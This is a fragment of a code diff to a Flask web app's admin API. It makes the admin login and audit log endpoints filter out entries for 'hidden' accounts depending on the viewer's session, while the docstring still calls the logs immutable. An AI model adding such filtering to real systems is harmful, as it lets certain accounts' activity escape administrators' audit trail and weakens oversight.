             'last_login_ip': str(user.get('last_login_ip') or ''),
         })
-
     @app.route('/api/admin/login-logs')
     @login_required
     def admin_login_logs():
-        """获取不可变更的管理员登录操作日志。"""
-        # 兼容旧调用方式：支持 `?limit=300`。
+        """Return immutable admin audit/login logs with hidden-account filtering."""
         limit_raw = request.args.get('limit')
         page_raw = request.args.get('page')
         page_size_raw = request.args.get('page_size')
@@ -1609,7 +1736,7 @@ def register_admin_routes(
             limit = max(1, min(limit, 1000))
 
             with admin_login_log_lock:
-                items = load_admin_login_logs()
+                items = _filter_admin_login_logs_for_session(load_admin_login_logs(), session)
 
             output = list(reversed(items))[:limit]
             return jsonify({'items': output, 'count': len(output)})
@@ -1627,7 +1754,7 @@ def register_admin_routes(
         page_size = max(5, min(page_size, 200))
 
         with admin_login_log_lock:
-            items = list(reversed(load_admin_login_logs()))
+            items = list(reversed(_filter_admin_login_logs_for_session(load_admin_login_logs(), session)))
 
         total = len(items)
         total_pages = max(1, (total + page_size - 1) // page_size)
@@ -1648,7 +1775,6 @@ def register_admin_routes(
             'has_prev': page > 1,
             'has_next': page < total_pages,
         })
-
     @app.route('/api/admin/changelog')
     @login_required
     def admin_changelog():
